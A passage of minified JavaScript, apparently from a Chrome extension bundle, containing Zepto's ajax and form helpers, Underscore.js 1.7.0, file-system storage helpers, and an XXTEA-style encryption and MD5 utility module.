                    e ? p(e, "parsererror", l, a, c) : w(b, l, a, c)
                } else p(l.statusText || null, l.status ? "error": "abort", l, a, c)
            }
        };
        if (!1 === r(l, a)) return l.abort(),
        p(null, "abort", l, a, c),
        l;
        if (a.xhrFields) for (x in a.xhrFields) l[x] = a.xhrFields[x];
        l.open(a.type, a.url, "async" in a ? a.async: !0, a.username, a.password);
        for (x in z) m.apply(l, z[x]);
        0 < a.timeout && (t = setTimeout(function() {
            l.onreadystatechange = u;
            l.abort();
            p(null, "timeout", l, a, c)
        },
        a.timeout));
        l.send(a.data ? a.data: null);
        return l
    };
    d.get = function() {
        return d.ajax(b.apply(null, arguments))
    };
    d.post = function() {
        var f = b.apply(null, arguments);
        f.type = "POST";
        return d.ajax(f)
    };
    d.getJSON = function() {
        var f = b.apply(null, arguments);
        f.dataType = "json";
        return d.ajax(f)
    };
    d.fn.load = function(f, a, c) {
        if (!this.length) return this;
        var e = this,
        k = f.split(/\s/),
        z;
        f = b(f, a, c);
        var l = f.success;
        1 < k.length && (f.url = k[0], z = k[1]);
        f.success = function(a) {
            e.html(z ? d("<div>").html(a.replace(H, "")).find(z) : a);
            l && l.apply(e, arguments)
        };
        d.ajax(f);
        return this
    };
    var G = encodeURIComponent;
    d.param = function(b, a) {
        var c = [];
        c.add = function(a, c) {
            d.isFunction(c) && (c = c());
            null == c && (c = "");
            this.push(G(a) + "=" + G(c))
        };
        l(c, b, a);
        return c.join("&").replace(/%20/g, "+")
    }
})(Zepto); (function(d) {
    d.fn.serializeArray = function() {
        var t, n, r = [],
        w = function(d) {
            if (d.forEach) return d.forEach(w);
            r.push({
                name: t,
                value: d
            })
        };
        this[0] && d.each(this[0].elements,
        function(p, m) {
            n = m.type; (t = m.name) && "fieldset" != m.nodeName.toLowerCase() && !m.disabled && "submit" != n && "reset" != n && "button" != n && "file" != n && ("radio" != n && "checkbox" != n || m.checked) && w(d(m).val())
        });
        return r
    };
    d.fn.serialize = function() {
        var d = [];
        this.serializeArray().forEach(function(n) {
            d.push(encodeURIComponent(n.name) + "=" + encodeURIComponent(n.value))
        });
        return d.join("&")
    };
    d.fn.submit = function(t) {
        if (0 in arguments) this.bind("submit", t);
        else if (this.length) {
            var n = d.Event("submit");
            this.eq(0).trigger(n);
            n.isDefaultPrevented() || this.get(0).submit()
        }
        return this
    }
})(Zepto); (function(d) {
    "__proto__" in {} || d.extend(d.zepto, {
        Z: function(n, r) {
            n = n || [];
            d.extend(n, d.fn);
            n.selector = r || "";
            n.__Z = !0;
            return n
        },
        isZ: function(n) {
            return "array" === d.type(n) && "__Z" in n
        }
    });
    try {
        getComputedStyle(void 0)
    } catch(n) {
        var t = getComputedStyle;
        window.getComputedStyle = function(d) {
            try {
                return t(d)
            } catch(w) {
                return null
            }
        }
    }
})(Zepto);
define("lib/z", [],
function(d, t, n) {
    n.exports = window.Zepto
}); (function() {
    var d = this,
    t = d._,
    n = Array.prototype,
    r = Object.prototype,
    w = n.push,
    p = n.slice,
    m = n.concat,
    u = r.toString,
    v = r.hasOwnProperty,
    r = Array.isArray,
    C = Object.keys,
    A = Function.prototype.bind,
    b = function(a) {
        if (a instanceof b) return a;
        if (! (this instanceof b)) return new b(a);
        this._wrapped = a
    };
    "undefined" !== typeof exports ? ("undefined" !== typeof module && module.exports && (exports = module.exports = b), exports._ = b) : d._ = b;
    b.VERSION = "1.7.0";
    var l = function(a, c, b) {
        if (void 0 === c) return a;
        switch (null == b ? 3 : b) {
        case 1:
            return function(b) {
                return a.call(c, b)
            };
        case 2:
            return function(b, e) {
                return a.call(c, b, e)
            };
        case 3:
            return function(b, e, f) {
                return a.call(c, b, e, f)
            };
        case 4:
            return function(b, e, f, l) {
                return a.call(c, b, e, f, l)
            }
        }
        return function() {
            return a.apply(c, arguments)
        }
    };
    b.iteratee = function(a, c, e) {
        return null == a ? b.identity: b.isFunction(a) ? l(a, c, e) : b.isObject(a) ? b.matches(a) : b.property(a)
    };
    b.each = b.forEach = function(a, c, e) {
        if (null == a) return a;
        c = l(c, e);
        var k = a.length;
        if (k === +k) for (e = 0; e < k; e++) c(a[e], e, a);
        else {
            var f = b.keys(a);
            e = 0;
            for (k = f.length; e < k; e++) c(a[f[e]], f[e], a)
        }
        return a
    };
    b.map = b.collect = function(a, c, e) {
        if (null == a) return [];
        c = b.iteratee(c, e);
        e = a.length !== +a.length && b.keys(a);
        for (var k = (e || a).length, f = Array(k), l, g = 0; g < k; g++) l = e ? e[g] : g,
        f[g] = c(a[l], l, a);
        return f
    };
    b.reduce = b.foldl = b.inject = function(a, c, e, k) {
        null == a && (a = []);
        c = l(c, k, 4);
        var f = a.length !== +a.length && b.keys(a),
        g = (f || a).length,
        h = 0,
        x;
        if (3 > arguments.length) {
            if (!g) throw new TypeError("Reduce of empty array with no initial value");
            e = a[f ? f[h++] : h++]
        }
        for (; h < g; h++) x = f ? f[h] : h,
        e = c(e, a[x], x, a);
        return e
    };
    b.reduceRight = b.foldr = function(a, c, e, k) {
        null == a && (a = []);
        c = l(c, k, 4);
        var f = a.length !== +a.length && b.keys(a),
        g = (f || a).length,
        h;
        if (3 > arguments.length) {
            if (!g) throw new TypeError("Reduce of empty array with no initial value");
            e = a[f ? f[--g] : --g]
        }
        for (; g--;) h = f ? f[g] : g,
        e = c(e, a[h], h, a);
        return e
    };
    b.find = b.detect = function(a, c, e) {
        var k;
        c = b.iteratee(c, e);
        b.some(a,
        function(a, b, e) {
            if (c(a, b, e)) return k = a,
            !0
        });
        return k
    };
    b.filter = b.select = function(a, c, e) {
        var k = [];
        if (null == a) return k;
        c = b.iteratee(c, e);
        b.each(a,
        function(a, b, e) {
            c(a, b, e) && k.push(a)
        });
        return k
    };
    b.reject = function(a, c, e) {
        return b.filter(a, b.negate(b.iteratee(c)), e)
    };
    b.every = b.all = function(a, c, e) {
        if (null == a) return ! 0;
        c = b.iteratee(c, e);
        e = a.length !== +a.length && b.keys(a);
        var k = (e || a).length,
        f,
        g;
        for (f = 0; f < k; f++) if (g = e ? e[f] : f, !c(a[g], g, a)) return ! 1;
        return ! 0
    };
    b.some = b.any = function(a, c, e) {
        if (null == a) return ! 1;
        c = b.iteratee(c, e);
        e = a.length !== +a.length && b.keys(a);
        var k = (e || a).length,
        f,
        g;
        for (f = 0; f < k; f++) if (g = e ? e[f] : f, c(a[g], g, a)) return ! 0;
        return ! 1
    };
    b.contains = b.include = function(a, c) {
        if (null == a) return ! 1;
        a.length !== +a.length && (a = b.values(a));
        return 0 <= b.indexOf(a, c)
    };
    b.invoke = function(a, c) {
        var e = p.call(arguments, 2),
        k = b.isFunction(c);
        return b.map(a,
        function(a) {
            return (k ? c: a[c]).apply(a, e)
        })
    };
    b.pluck = function(a, c) {
        return b.map(a, b.property(c))
    };
    b.where = function(a, c) {
        return b.filter(a, b.matches(c))
    };
    b.findWhere = function(a, c) {
        return b.find(a, b.matches(c))
    };
    b.max = function(a, c, e) {
        var k = -Infinity,
        f = -Infinity,
        g;
        if (null == c && null != a) {
            a = a.length === +a.length ? a: b.values(a);
            for (var l = 0,
            h = a.length; l < h; l++) e = a[l],
            e > k && (k = e)
        } else c = b.iteratee(c, e),
        b.each(a,
        function(a, b, e) {
            g = c(a, b, e);
            if (g > f || -Infinity === g && -Infinity === k) k = a,
            f = g
        });
        return k
    };
    b.min = function(a, c, e) {
        var k = Infinity,
        f = Infinity,
        g;
        if (null == c && null != a) {
            a = a.length === +a.length ? a: b.values(a);
            for (var l = 0,
            h = a.length; l < h; l++) e = a[l],
            e < k && (k = e)
        } else c = b.iteratee(c, e),
        b.each(a,
        function(a, b, e) {
            g = c(a, b, e);
            if (g < f || Infinity === g && Infinity === k) k = a,
            f = g
        });
        return k
    };
    b.shuffle = function(a) {
        a = a && a.length === +a.length ? a: b.values(a);
        for (var c = a.length,
        e = Array(c), k = 0, f; k < c; k++) f = b.random(0, k),
        f !== k && (e[k] = e[f]),
        e[f] = a[k];
        return e
    };
    b.sample = function(a, c, e) {
        return null == c || e ? (a.length !== +a.length && (a = b.values(a)), a[b.random(a.length - 1)]) : b.shuffle(a).slice(0, Math.max(0, c))
    };
    b.sortBy = function(a, c, e) {
        c = b.iteratee(c, e);
        return b.pluck(b.map(a,
        function(a, b, e) {
            return {
                value: a,
                index: b,
                criteria: c(a, b, e)
            }
        }).sort(function(a, c) {
            var b = a.criteria,
            e = c.criteria;
            if (b !== e) {
                if (b > e || void 0 === b) return 1;
                if (b < e || void 0 === e) return - 1
            }
            return a.index - c.index
        }), "value")
    };
    var h = function(a) {
        return function(c, e, k) {
            var f = {};
            e = b.iteratee(e, k);
            b.each(c,
            function(b, k) {
                var g = e(b, k, c);
                a(f, b, g)
            });
            return f
        }
    };
    b.groupBy = h(function(a, c, e) {
        b.has(a, e) ? a[e].push(c) : a[e] = [c]
    });
    b.indexBy = h(function(a, c, b) {
        a[b] = c
    });
    b.countBy = h(function(a, c, e) {
        b.has(a, e) ? a[e]++:a[e] = 1
    });
    b.sortedIndex = function(a, c, e, k) {
        e = b.iteratee(e, k, 1);
        c = e(c);
        k = 0;
        for (var f = a.length; k < f;) {
            var g = k + f >>> 1;
            e(a[g]) < c ? k = g + 1 : f = g
        }
        return k
    };
    b.toArray = function(a) {
        return a ? b.isArray(a) ? p.call(a) : a.length === +a.length ? b.map(a, b.identity) : b.values(a) : []
    };
    b.size = function(a) {
        return null == a ? 0 : a.length === +a.length ? a.length: b.keys(a).length
    };
    b.partition = function(a, c, e) {
        c = b.iteratee(c, e);
        var k = [],
        f = [];
        b.each(a,
        function(a, b, e) { (c(a, b, e) ? k: f).push(a)
        });
        return [k, f]
    };
    b.first = b.head = b.take = function(a, c, b) {
        return null == a ? void 0 : null == c || b ? a[0] : 0 > c ? [] : p.call(a, 0, c)
    };
    b.initial = function(a, c, b) {
        return p.call(a, 0, Math.max(0, a.length - (null == c || b ? 1 : c)))
    };
    b.last = function(a, c, b) {
        return null == a ? void 0 : null == c || b ? a[a.length - 1] : p.call(a, Math.max(a.length - c, 0))
    };
    b.rest = b.tail = b.drop = function(a, c, b) {
        return p.call(a, null == c || b ? 1 : c)
    };
    b.compact = function(a) {
        return b.filter(a, b.identity)
    };
    var f = function(a, c, e, k) {
        if (c && b.every(a, b.isArray)) return m.apply(k, a);
        for (var g = 0,
        l = a.length; g < l; g++) {
            var h = a[g];
            b.isArray(h) || b.isArguments(h) ? c ? w.apply(k, h) : f(h, c, e, k) : e || k.push(h)
        }
        return k
    };
    b.flatten = function(a, c) {
        return f(a, c, !1, [])
    };
    b.without = function(a) {
        return b.difference(a, p.call(arguments, 1))
    };
    b.uniq = b.unique = function(a, c, e, k) {
        if (null == a) return [];
        b.isBoolean(c) || (k = e, e = c, c = !1);
        null != e && (e = b.iteratee(e, k));
        k = [];
        for (var f = [], g = 0, l = a.length; g < l; g++) {
            var h = a[g];
            if (c) g && f === h || k.push(h),
            f = h;
            else if (e) {
                var x = e(h, g, a);
                0 > b.indexOf(f, x) && (f.push(x), k.push(h))
            } else 0 > b.indexOf(k, h) && k.push(h)
        }
        return k
    };
    b.union = function() {
        return b.uniq(f(arguments, !0, !0, []))
    };
    b.intersection = function(a) {
        if (null == a) return [];
        for (var c = [], e = arguments.length, k = 0, f = a.length; k < f; k++) {
            var g = a[k];
            if (!b.contains(c, g)) {
                for (var l = 1; l < e && b.contains(arguments[l], g); l++);
                l === e && c.push(g)
            }
        }
        return c
    };
    b.difference = function(a) {
        var c = f(p.call(arguments, 1), !0, !0, []);
        return b.filter(a,
        function(a) {
            return ! b.contains(c, a)
        })
    };
    b.zip = function(a) {
        if (null == a) return [];
        for (var c = b.max(arguments, "length").length, e = Array(c), k = 0; k < c; k++) e[k] = b.pluck(arguments, k);
        return e
    };
    b.object = function(a, c) {
        if (null == a) return {};
        for (var b = {},
        k = 0,
        f = a.length; k < f; k++) c ? b[a[k]] = c[k] : b[a[k][0]] = a[k][1];
        return b
    };
    b.indexOf = function(a, c, e) {
        if (null == a) return - 1;
        var k = 0,
        f = a.length;
        if (e) if ("number" == typeof e) k = 0 > e ? Math.max(0, f + e) : e;
        else return k = b.sortedIndex(a, c),
        a[k] === c ? k: -1;
        for (; k < f; k++) if (a[k] === c) return k;
        return - 1
    };
    b.lastIndexOf = function(a, c, b) {
        if (null == a) return - 1;
        var k = a.length;
        for ("number" == typeof b && (k = 0 > b ? k + b + 1 : Math.min(k, b + 1)); 0 <= --k;) if (a[k] === c) return k;
        return - 1
    };
    b.range = function(a, c, b) {
        1 >= arguments.length && (c = a || 0, a = 0);
        b = b || 1;
        for (var k = Math.max(Math.ceil((c - a) / b), 0), f = Array(k), g = 0; g < k; g++, a += b) f[g] = a;
        return f
    };
    var g = function() {};
    b.bind = function(a, c) {
        var e, f;
        if (A && a.bind === A) return A.apply(a, p.call(arguments, 1));
        if (!b.isFunction(a)) throw new TypeError("Bind must be called on a function");
        e = p.call(arguments, 2);
        return f = function() {
            if (! (this instanceof f)) return a.apply(c, e.concat(p.call(arguments)));
            g.prototype = a.prototype;
            var l = new g;
            g.prototype = null;
            var h = a.apply(l, e.concat(p.call(arguments)));
            return b.isObject(h) ? h: l
        }
    };
    b.partial = function(a) {
        var c = p.call(arguments, 1);
        return function() {
            for (var e = 0,
            f = c.slice(), g = 0, l = f.length; g < l; g++) f[g] === b && (f[g] = arguments[e++]);
            for (; e < arguments.length;) f.push(arguments[e++]);
            return a.apply(this, f)
        }
    };
    b.bindAll = function(a) {
        var c, e = arguments.length,
        f;
        if (1 >= e) throw Error("bindAll must be passed function names");
        for (c = 1; c < e; c++) f = arguments[c],
        a[f] = b.bind(a[f], a);
        return a
    };
    b.memoize = function(a, c) {
        var e = function(f) {
            var g = e.cache,
            l = c ? c.apply(this, arguments) : f;
            b.has(g, l) || (g[l] = a.apply(this, arguments));
            return g[l]
        };
        e.cache = {};
        return e
    };
    b.delay = function(a, c) {
        var b = p.call(arguments, 2);
        return setTimeout(function() {
            return a.apply(null, b)
        },
        c)
    };
    b.defer = function(a) {
        return b.delay.apply(b, [a, 1].concat(p.call(arguments, 1)))
    };
    b.throttle = function(a, c, e) {
        var f, g, l, h = null,
        x = 0;
        e || (e = {});
        var m = function() {
            x = !1 === e.leading ? 0 : b.now();
            h = null;
            l = a.apply(f, g);
            h || (f = g = null)
        };
        return function() {
            var d = b.now();
            x || !1 !== e.leading || (x = d);
            var p = c - (d - x);
            f = this;
            g = arguments;
            0 >= p || p > c ? (clearTimeout(h), h = null, x = d, l = a.apply(f, g), h || (f = g = null)) : h || !1 === e.trailing || (h = setTimeout(m, p));
            return l
        }
    };
    b.debounce = function(a, c, e) {
        var f, g, l, h, x, m = function() {
            var d = b.now() - h;
            d < c && 0 < d ? f = setTimeout(m, c - d) : (f = null, e || (x = a.apply(l, g), f || (l = g = null)))
        };
        return function() {
            l = this;
            g = arguments;
            h = b.now();
            var d = e && !f;
            f || (f = setTimeout(m, c));
            d && (x = a.apply(l, g), l = g = null);
            return x
        }
    };
    b.wrap = function(a, c) {
        return b.partial(c, a)
    };
    b.negate = function(a) {
        return function() {
            return ! a.apply(this, arguments)
        }
    };
    b.compose = function() {
        var a = arguments,
        c = a.length - 1;
        return function() {
            for (var b = c,
            f = a[c].apply(this, arguments); b--;) f = a[b].call(this, f);
            return f
        }
    };
    b.after = function(a, c) {
        return function() {
            if (1 > --a) return c.apply(this, arguments)
        }
    };
    b.before = function(a, c) {
        var b;
        return function() {
            0 < --a ? b = c.apply(this, arguments) : c = null;
            return b
        }
    };
    b.once = b.partial(b.before, 2);
    b.keys = function(a) {
        if (!b.isObject(a)) return [];
        if (C) return C(a);
        var c = [],
        e;
        for (e in a) b.has(a, e) && c.push(e);
        return c
    };
    b.values = function(a) {
        for (var c = b.keys(a), e = c.length, f = Array(e), g = 0; g < e; g++) f[g] = a[c[g]];
        return f
    };
    b.pairs = function(a) {
        for (var c = b.keys(a), e = c.length, f = Array(e), g = 0; g < e; g++) f[g] = [c[g], a[c[g]]];
        return f
    };
    b.invert = function(a) {
        for (var c = {},
        e = b.keys(a), f = 0, g = e.length; f < g; f++) c[a[e[f]]] = e[f];
        return c
    };
    b.functions = b.methods = function(a) {
        var c = [],
        e;
        for (e in a) b.isFunction(a[e]) && c.push(e);
        return c.sort()
    };
    b.extend = function(a) {
        if (!b.isObject(a)) return a;
        for (var c, e, f = 1,
        g = arguments.length; f < g; f++) for (e in c = arguments[f], c) v.call(c, e) && (a[e] = c[e]);
        return a
    };
    b.pick = function(a, c, e) {
        var f = {},
        g;
        if (null == a) return f;
        if (b.isFunction(c)) for (g in c = l(c, e), a) {
            var h = a[g];
            c(h, g, a) && (f[g] = h)
        } else {
            h = m.apply([], p.call(arguments, 1));
            a = Object(a);
            for (var x = 0,
            d = h.length; x < d; x++) g = h[x],
            g in a && (f[g] = a[g])
        }
        return f
    };
    b.omit = function(a, c, e) {
        if (b.isFunction(c)) c = b.negate(c);
        else {
            var f = b.map(m.apply([], p.call(arguments, 1)), String);
            c = function(a, c) {
                return ! b.contains(f, c)
            }
        }
        return b.pick(a, c, e)
    };
    b.defaults = function(a) {
        if (!b.isObject(a)) return a;
        for (var c = 1,
        e = arguments.length; c < e; c++) {
            var f = arguments[c],
            g;
            for (g in f) void 0 === a[g] && (a[g] = f[g])
        }
        return a
    };
    b.clone = function(a) {
        return b.isObject(a) ? b.isArray(a) ? a.slice() : b.extend({},
        a) : a
    };
    b.tap = function(a, c) {
        c(a);
        return a
    };
    var x = function(a, c, e, f) {
        if (a === c) return 0 !== a || 1 / a === 1 / c;
        if (null == a || null == c) return a === c;
        a instanceof b && (a = a._wrapped);
        c instanceof b && (c = c._wrapped);
        var g = u.call(a);
        if (g !== u.call(c)) return ! 1;
        switch (g) {
        case "[object RegExp]":
        case "[object String]":
            return "" + a === "" + c;
        case "[object Number]":
            return + a !== +a ? +c !== +c: 0 === +a ? 1 / +a === 1 / c: +a === +c;
        case "[object Date]":
        case "[object Boolean]":
            return + a === +c
        }
        if ("object" != typeof a || "object" != typeof c) return ! 1;
        for (var l = e.length; l--;) if (e[l] === a) return f[l] === c;
        var l = a.constructor,
        h = c.constructor;
        if (l !== h && "constructor" in a && "constructor" in c && !(b.isFunction(l) && l instanceof l && b.isFunction(h) && h instanceof h)) return ! 1;
        e.push(a);
        f.push(c);
        if ("[object Array]" === g) {
            if (g = a.length, h = g === c.length) for (; g--&&(h = x(a[g], c[g], e, f)););
        } else if (l = b.keys(a), g = l.length, h = b.keys(c).length === g) for (; g--&&(h = l[g], h = b.has(c, h) && x(a[h], c[h], e, f)););
        e.pop();
        f.pop();
        return h
    };
    b.isEqual = function(a, c) {
        return x(a, c, [], [])
    };
    b.isEmpty = function(a) {
        if (null == a) return ! 0;
        if (b.isArray(a) || b.isString(a) || b.isArguments(a)) return 0 === a.length;
        for (var c in a) if (b.has(a, c)) return ! 1;
        return ! 0
    };
    b.isElement = function(a) {
        return ! (!a || 1 !== a.nodeType)
    };
    b.isArray = r ||
    function(a) {
        return "[object Array]" === u.call(a)
    };
    b.isObject = function(a) {
        var c = typeof a;
        return "function" === c || "object" === c && !!a
    };
    b.each("Arguments Function String Number Date RegExp".split(" "),
    function(a) {
        b["is" + a] = function(c) {
            return u.call(c) === "[object " + a + "]"
        }
    });
    b.isArguments(arguments) || (b.isArguments = function(a) {
        return b.has(a, "callee")
    });
    "function" !== typeof / . / &&(b.isFunction = function(a) {
        return "function" == typeof a || !1
    });
    b.isFinite = function(a) {
        return isFinite(a) && !isNaN(parseFloat(a))
    };
    b.isNaN = function(a) {
        return b.isNumber(a) && a !== +a
    };
    b.isBoolean = function(a) {
        return ! 0 === a || !1 === a || "[object Boolean]" === u.call(a)
    };
    b.isNull = function(a) {
        return null === a
    };
    b.isUndefined = function(a) {
        return void 0 === a
    };
    b.has = function(a, c) {
        return null != a && v.call(a, c)
    };
    b.noConflict = function() {
        d._ = t;
        return this
    };
    b.identity = function(a) {
        return a
    };
    b.constant = function(a) {
        return function() {
            return a
        }
    };
    b.noop = function() {};
    b.property = function(a) {
        return function(c) {
            return c[a]
        }
    };
    b.matches = function(a) {
        var c = b.pairs(a),
        e = c.length;
        return function(a) {
            if (null == a) return ! e;
            a = Object(a);
            for (var b = 0; b < e; b++) {
                var f = c[b],
                g = f[0];
                if (f[1] !== a[g] || !(g in a)) return ! 1
            }
            return ! 0
        }
    };
    b.times = function(a, c, b) {
        var f = Array(Math.max(0, a));
        c = l(c, b, 1);
        for (b = 0; b < a; b++) f[b] = c(b);
        return f
    };
    b.random = function(a, b) {
        null == b && (b = a, a = 0);
        return a + Math.floor(Math.random() * (b - a + 1))
    };
    b.now = Date.now ||
    function() {
        return (new Date).getTime()
    };
    var r = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
        "`": "&#x60;"
    },
    h = b.invert(r),
    H = function(a) {
        var c = function(b) {
            return a[b]
        },
        e = "(?:" + b.keys(a).join("|") + ")",
        f = RegExp(e),
        g = RegExp(e, "g");
        return function(a) {
            a = null == a ? "": "" + a;
            return f.test(a) ? a.replace(g, c) : a
        }
    };
    b.escape = H(r);
    b.unescape = H(h);
    b.result = function(a, c) {
        if (null != a) {
            var e = a[c];
            return b.isFunction(e) ? a[c]() : e
        }
    };
    var E = 0;
    b.uniqueId = function(a) {
        var b = ++E + "";
        return a ? a + b: b
    };
    b.templateSettings = {
        evaluate: /<%([\s\S]+?)%>/g,
        interpolate: /<%=([\s\S]+?)%>/g,
        escape: /<%-([\s\S]+?)%>/g
    };
    var B = /(.)^/,
    q = {
        "'": "'",
        "\\": "\\",
        "\r": "r",
        "\n": "n",
        "\u2028": "u2028",
        "\u2029": "u2029"
    },
    F = /\\|'|\r|\n|\u2028|\u2029/g,
    G = function(a) {
        return "\\" + q[a]
    };
    b.template = function(a, c, e) { ! c && e && (c = e);
        c = b.defaults({},
        c, b.templateSettings);
        e = RegExp([(c.escape || B).source, (c.interpolate || B).source, (c.evaluate || B).source].join("|") + "|$", "g");
        var f = 0,
        g = "__p+='";
        a.replace(e,
        function(b, c, e, l, h) {
            g += a.slice(f, h).replace(F, G);
            f = h + b.length;
            c ? g += "'+\n((__t=(" + c + "))==null?'':_.escape(__t))+\n'": e ? g += "'+\n((__t=(" + e + "))==null?'':__t)+\n'": l && (g += "';\n" + l + "\n__p+='");
            return b
        });
        g += "';\n";
        c.variable || (g = "with(obj||{}){\n" + g + "}\n");
        g = "var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n" + g + "return __p;\n";
        try {
            var l = new Function(c.variable || "obj", "_", g)
        } catch(h) {
            throw h.source = g,
            h;
        }
        e = function(a) {
            return l.call(this, a, b)
        };
        e.source = "function(" + (c.variable || "obj") + "){\n" + g + "}";
        return e
    };
    b.chain = function(a) {
        a = b(a);
        a._chain = !0;
        return a
    };
    var y = function(a) {
        return this._chain ? b(a).chain() : a
    };
    b.mixin = function(a) {
        b.each(b.functions(a),
        function(c) {
            var e = b[c] = a[c];
            b.prototype[c] = function() {
                var a = [this._wrapped];
                w.apply(a, arguments);
                return y.call(this, e.apply(b, a))
            }
        })
    };
    b.mixin(b);
    b.each("pop push reverse shift sort splice unshift".split(" "),
    function(a) {
        var c = n[a];
        b.prototype[a] = function() {
            var b = this._wrapped;
            c.apply(b, arguments);
            "shift" !== a && "splice" !== a || 0 !== b.length || delete b[0];
            return y.call(this, b)
        }
    });
    b.each(["concat", "join", "slice"],
    function(a) {
        var c = n[a];
        b.prototype[a] = function() {
            return y.call(this, c.apply(this._wrapped, arguments))
        }
    });
    b.prototype.value = function() {
        return this._wrapped
    };
    define("lib/u", [],
    function(a, c, e) {
        e.exports = b
    })
}).call(this);
define("app/u", [],
function(d, t) {
    d("lib/z");
    t.info = {
        appID: chrome.i18n.getMessage("@@extension_id"),
        appVersion: chrome.runtime.getManifest().version,
        platform: "chromium",
        locale: "zh-cn",
        rootServer: localStorage.rootServer,
        platformVersion: function() {
            var d = /\bChrome\/(\S+)/.exec(navigator.userAgent);
            return d ? d[1] : "0"
        },
        appStartTime: Date.now()
    };
    t.onlineTime = function(d) {
        d((new Date).toISOString().substr(0, 19).replace(/-/g, "").replace(/:/g, ""))
    };
    t.offlineTime = function() {
        return (new Date).toISOString().substr(0, 19).replace(/-/g, "").replace(/:/g, "")
    };
    t.IO = {
        _MAXSPACE: 104857600,
        G: function(d, r, w, p) { (window.requestFileSystem || window.webkitRequestFileSystem)(window.PERSISTENT, this._MAXSPACE,
            function(m) {
                m.root.getFile(d, {
                    create: r
                },
                function(d) {
                    w(m, d)
                },
                p)
            },
            p)
        },
        R: function(d, r, w) {
            this.G(d, !1,
            function(d, m) {
                m.file(function(d) {
                    var m = new FileReader;
                    m.onloadend = function() {
                        r(m.result)
                    };
                    m.readAsText(d)
                },
                w)
            },
            w)
        },
        W: function(d, r, w, p) {
            var m = function(d, m, p, w) {
                t.IO.G(d, !0,
                function(b, l) {
                    l.createWriter(function(b) {
                        b.onwriteend = p;
                        b.onerror = w;
                        var f = new Blob([m], {
                            type: "text/plain"
                        });
                        b.write(f)
                    },
                    w)
                },
                w)
            };
            this.D(d,
            function() {
                m(d, r, w, p)
            },
            function() {
                m(d, r, w, p)
            })
        },
        D: function(d, r, w) {
            this.G(d, !1,
            function(d, m) {
                m.remove(function() {
                    r()
                },
                w)
            },
            w)
        },
        E: function(d, r) {
            this.G(fileName, !1,
            function() {
                r(!0)
            },
            function() {
                r(!1)
            })
        }
    }
});
define("lib/t", [],
function(d, t, n) {
    var r = {
        E: function(d, p) {
            d = String(d);
            p = String(p);
            if (0 == d.length) return "";
            var m = r.strToLongs(d.utf8Encode()),
            u = r.strToLongs(p.utf8Encode().slice(0, 16)),
            m = r.encode(m, u);
            return r.longsToStr(m).base64Encode()
        },
        D: function(d, p) {
            d = String(d);
            p = String(p);
            if (0 == d.length) return "";
            var m = r.strToLongs(d.base64Decode()),
            u = r.strToLongs(p.utf8Encode().slice(0, 16)),
            m = r.decode(m, u),
            m = r.longsToStr(m),
            m = m.replace(/\0+$/, "");
            return m.utf8Decode()
        },
        encode: function(d, p) {
            2 > d.length && (d[1] = 0);
            for (var m = d.length,
            u = d[m - 1], v, n, r = Math.floor(6 + 52 / m), b = 0; 0 < r--;) {
                b += 2654435769;
                n = b >>> 2 & 3;
                for (var l = 0; l < m; l++) v = d[(l + 1) % m],
                u = (u >>> 5 ^ v << 2) + (v >>> 3 ^ u << 4) ^ (b ^ v) + (p[l & 3 ^ n] ^ u),
                u = d[l] += u
            }
            return d
        },
        decode: function(d, p) {
            for (var m = d.length,
            u, v = d[0], n, r = 2654435769 * Math.floor(6 + 52 / m); 0 != r;) {
                n = r >>> 2 & 3;
                for (var b = m - 1; 0 <= b; b--) u = d[0 < b ? b - 1 : m - 1],
                u = (u >>> 5 ^ v << 2) + (v >>> 3 ^ u << 4) ^ (r ^ v) + (p[b & 3 ^ n] ^ u),
                v = d[b] -= u;
                r -= 2654435769
            }
            return d
        },
        strToLongs: function(d) {
            for (var p = Array(Math.ceil(d.length / 4)), m = 0; m < p.length; m++) p[m] = d.charCodeAt(4 * m) + (d.charCodeAt(4 * m + 1) << 8) + (d.charCodeAt(4 * m + 2) << 16) + (d.charCodeAt(4 * m + 3) << 24);
            return p
        },
        longsToStr: function(d) {
            for (var p = Array(d.length), m = 0; m < d.length; m++) p[m] = String.fromCharCode(d[m] & 255, d[m] >>> 8 & 255, d[m] >>> 16 & 255, d[m] >>> 24 & 255);
            return p.join("")
        }
    };
    "undefined" == typeof String.prototype.utf8Encode && (String.prototype.utf8Encode = function() {
        return unescape(encodeURIComponent(this))
    });
    "undefined" == typeof String.prototype.utf8Decode && (String.prototype.utf8Decode = function() {
        try {
            return decodeURIComponent(escape(this))
        } catch(d) {
            return this
        }
    });
    "undefined" == typeof String.prototype.base64Encode && (String.prototype.base64Encode = function() {
        return this
    });
    "undefined" == typeof String.prototype.base64Decode && (String.prototype.base64Decode = function() {
        return this
    });
    r.P = function(d, p) {
        for (var m = (d + p).replace("T", ""), u = [], v = 0; 16 > v; v++) u.push(String.fromCharCode(parseInt(m.charCodeAt(v) + m.charCodeAt(v + 16) + m.charCodeAt(v + 32)) / 3));
        return u.join("")
    };
    r.G = function() {
        function d() {
            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
        }
        return d() + d() + "-" + d() + "-" + d() + "-" + d() + "-" + d() + d() + d()
    };
    r.M = function(d) {
        function p(b, l) {
            var h = b[0],
            f = b[1],
            g = b[2],
            d = b[3],
            h = u(h, f, g, d, l[0], 7, -680876936),
            d = u(d, h, f, g, l[1], 12, -389564586),
            g = u(g, d, h, f, l[2], 17, 606105819),
            f = u(f, g, d, h, l[3], 22, -1044525330),
            h = u(h, f, g, d, l[4], 7, -176418897),
            d = u(d, h, f, g, l[5], 12, 1200080426),
            g = u(g, d, h, f, l[6], 17, -1473231341),
            f = u(f, g, d, h, l[7], 22, -45705983),
            h = u(h, f, g, d, l[8], 7, 1770035416),
            d = u(d, h, f, g, l[9], 12, -1958414417),
            g = u(g, d, h, f, l[10], 17, -42063),
            f = u(f, g, d, h, l[11], 22, -1990404162),
            h = u(h, f, g, d, l[12], 7, 1804603682),
            d = u(d, h, f, g, l[13], 12, -40341101),
            g = u(g, d, h, f, l[14], 17, -1502002290),
            f = u(f, g, d, h, l[15], 22, 1236535329),
            h = v(h, f, g, d, l[1], 5, -165796510),
            d = v(d, h, f, g, l[6], 9, -1069501632),
            g = v(g, d, h, f, l[11], 14, 643717713),
            f = v(f, g, d, h, l[0], 20, -373897302),
            h = v(h, f, g, d, l[5], 5, -701558691),
            d = v(d, h, f, g, l[10], 9, 38016083),
